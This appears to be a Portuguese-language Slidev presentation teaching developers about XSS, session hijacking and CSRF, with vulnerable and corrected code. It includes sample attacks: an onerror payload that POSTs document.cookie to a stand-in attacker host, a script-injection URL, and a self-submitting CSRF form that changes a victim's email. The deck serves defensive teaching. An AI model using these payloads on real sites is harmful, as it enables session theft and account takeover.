---
# try also 'default' to start simple
theme: default
# random image from a curated Unsplash collection by Anthony
# like them? see https://unsplash.com/collections/94734566/slidev
background: https://source.unsplash.com/collection/94734566/1920x1080
# apply any windi css classes to the current slide
class: 'text-center'
# https://sli.dev/custom/highlighters.html
highlighter: shiki
# show line numbers in code blocks
lineNumbers: false
# some information about the slides, markdown enabled
info: |
  ## Slidev Starter Template
  Presentation slides for developers.

  Learn more at [Sli.dev](https://sli.dev)
# persist drawings in exports and build
drawings:
  persist: false
# page transition
transition: slide-left
# use UnoCSS
css: unocss
---

# DevSec

Entendendo e corrigindo vulnerabilidades de Sessão e XSS

<div class="pt-12">
  <span @click="$slidev.nav.next" class="px-2 py-1 rounded cursor-pointer" hover="bg-white bg-opacity-10">
    Leri go! <carbon:arrow-right class="inline"/>
  </span>
</div>

<div class="abs-br m-6 flex gap-2">
  <button @click="$slidev.nav.openInEditor()" title="Open in Editor" class="text-xl slidev-icon-btn opacity-50 !border-none !hover:text-white">
    <carbon:edit />
  </button>
  <a href="https://github.com/slidevjs/slidev" target="_blank" alt="GitHub"
    class="text-xl slidev-icon-btn opacity-50 !border-none !hover:text-white">
    <carbon-logo-github />
  </a>
</div>

<!--
The last comment block of each slide will be treated as slide notes. It will be visible and editable in Presenter Mode along with the slide. [Read more in the docs](https://sli.dev/guide/syntax.html#notes)
-->

---
src: pages/guisso-queisso.md
---

---
layout: default
---

# Visão Geral

<Toc></Toc>

---
layout: image-right
image: https://source.unsplash.com/collection/94734566/1920x1080
---

# Introdução a segurança em javascript

Javascript é a espinha dorsal de muitas aplicações web modernas, tornando a segurança em JavaScript de vital importância. Sem uma segurança robusta, aplicações estão expostas a várias ameaças, desde ataques de injeção de código até o vazamento de dados sensíveis dos usuários. Além de potenciais perdas financeiras, a falta de segurança pode danificar a reputação de uma marca e levar a implicações legais graves. Dessa forma, proteger suas aplicações JavaScript não é apenas uma boa prática de desenvolvimento, mas uma necessidade comercial e legal.

---
class: px-20
---

# Notícias
[CanalTech](https://canaltech.com.br/seguranca/github-corrige-7-falhas-encontradas-em-pacotes-nodejs-195257/)

<img src="/canaltech-github.png" class="rounded shadow" />

---
class: px-20
---

# Notícias
[Snyk Blog](https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/)


<img src="/snyk-event-stream.png" class="rounded shadow" />

---

# Vulnerabilidades comuns

<v-clicks>

- 🐵: Vulnerabilidades no código-fonte
- 🐔: Execução indesejada de script
- 🐸: Escapando/codificando entrada do usuário
- 🦄: Filtrando entrada
- 🐙: Validação de entrada
- 🐧: Validação do lado do cliente
- 🐷: Roubando dados da sessão
- 🐼: Induzindo usuários a realizar ações não intencionadas

</v-clicks>

---

# XSS

<div grid="~ cols-2 gap-4">
<div>
As falhas de XSS ocorrem sempre que uma aplicação inclui dados não-confiáveis numa nova página web sem a validação ou filtragem apropriadas, ou quando atualiza uma página web existente com dados enviados por um utilizador através de uma API do browser que possa criar JavaScript. O XSS permite que atacantes possam executar scripts no browser da vítima, os quais podem raptar sessões do utilizador, descaraterizar sites web ou redirecionar o utilizador para sites maliciosos.
</div>
<div>

<v-click>

### prank
```html
 <iframe width="100%" height="166" scrolling="no"
    frameborder="no" allow="autoplay"
    src="http://ellisonleao.github.io/clumsy-bird/">
 </iframe>
```
</v-click>

<v-click>

### get localStorage/cookie
```html {1-3|5-14|7-12|10|all}
<image src=1 href=1
    onerror="javascript:alert(localStorage[0])">
</image>

<image src=1 href=1
    onerror="
    javascript:fetch('https://maquina.atacante.com/',
        { method: 'POST',
            body: JSON.stringify({
                cookie: document.cookie
            })
        });
">
</image>
```
</v-click>

</div>
</div>

<style>
h1 {
  background-color: #2B90B6;
  background-image: linear-gradient(45deg, #4EC5D4 10%, #146b8c 20%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent; 
  -moz-text-fill-color: transparent;
}
</style>

---

# Tipos de XSS
<div grid="~ cols-3 gap-2">
<p v-click>

**Reflected XSS**
Esse é o tipo mais comum de ataque XSS. Nele, o script malicioso é parte da solicitação HTTP feita ao site. Quando a página web responde, ela inclui esse script na resposta. Um exemplo comum é o script inserido na URL da página.

</p>

<p v-click>

**Stored XSS**
Também conhecido como XSS persistente, é o tipo mais perigoso de ataque XSS. Nesse caso, o script malicioso é enviado para o servidor (geralmente através de um formulário) e armazenado lá. Quando outras páginas recuperam e exibem esse dado, o script é enviado ao navegador do usuário.
</p>

<p v-click>

**DOM XSS**
Neste tipo, o script malicioso manipula o Document Object Model (DOM) de uma página web. Acontece quando um script client-side escreve dados fornecidos pelo usuário no DOM.
</p>
</div>

<style>
strong {
  background-image: linear-gradient(45deg, #4EC5D4 30%, #146b8c 40%);
  background-size: 100%;
  -webkit-background-clip: text;
  -moz-background-clip: text;
  -webkit-text-fill-color: transparent; 
  -moz-text-fill-color: transparent;
}
</style>

---

# Correção de XSS
`https://site-vulneravel/?search=<script>document.cookie</script>`

<div grid="~ cols-2 gap-4">

<div>

Vulnerável
```html {all|5|6|all}
<html>
  <body>
    <script>
        let params = new URLSearchParams(location.search);
        let search = params.get('search');
        document.write('Resultados para: ' + search);
    </script>
  </body>
</html>
```

</div>

<div>

Corrigido
```html {none|5|6-8|all}
<html>
  <body>
    <script>
        let params = new URLSearchParams(location.search);
        let search = params.get('search');
        let pTag = document.createElement("p");
        pTag.innerText = 'Resultados para: ' + search;
        document.body.appendChild(pTag);
    </script>
  </body>
</html>
```

</div>

</div>

---

# Vulnerabilidades de Sessão

<div grid="~ cols-2 gap-4">
<div>

Uma vulnerabilidade de sessão ocorre quando um atacante é capaz de sequestrar a sessão do usuário para assumir a identidade do usuário, explorando as falhas na forma como a aplicação gerencia as sessões.

</div>

<div>

<v-clicks>

- 🐛 Ataques XSS (Cross-Site Scripting)
- 🔮 Previsibilidade do ID de Sessão
- 📡 Sniffing de Rede
- 🎭 Ataque Man-in-the-Middle (MitM)
- 🎣 Ataques de Fixação de Sessão
- 📨 Ataques CSRF (Cross-Site Request Forgery)

</v-clicks>

</div>
</div>
---

# CSRF
[CSRF PortSwigger Academy](https://portswigger.net/web-security/csrf)

<img src="/csrf-portswigger.png" class="rounded shadow" />

---

# CSRF no código

<div grid="~ cols-2 gap-4">
<div>

```html {4-5|6-10|all}
<html>
  <body>
    <form
        action="https://vulnerable-website.com/email/change"
        method="POST">
        <input
            type="hidden"
            name="email"
            value="pwned@evil-user.net"
        />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```
</div>
<div>

NGINX
```yaml {none|all}
location / {
    proxy_cookie_path / "/; HttpOnly";
    ...
}
```

Node
```js {none|all}
res.cookie(
    'your_cookie_name',
    'your_value',
    { httpOnly: true }
);
```
</div>
</div>

---

# Correção de vulnerabilidades de Sessão

<div grid="~ cols-2 gap-4">
<div>

<v-clicks>

- ⏳ Renovação do ID de Sessão
- 📍 Bloqueio de Endereço IP
- 🕵️ Verificação do Agente do Usuário
- 🛡️ Uso de Tokens CSRF
- ⏲️ Limitação de Tempo de Vida da Sessão
- 🔑 Logout Efetivo
- 🖼️ Proteção contra Clickjacking
- 🍪 Uso de Cookies HTTP-Only

</v-clicks>

</div>

<div>

O que isso previne?
<v-clicks>

- Furto de identidade do usuário
- Acesso não autorizado a dados confidenciais
- Perda de controle sobre a conta do usuário

</v-clicks>

</div>


</div>

---

# Obrigado!!!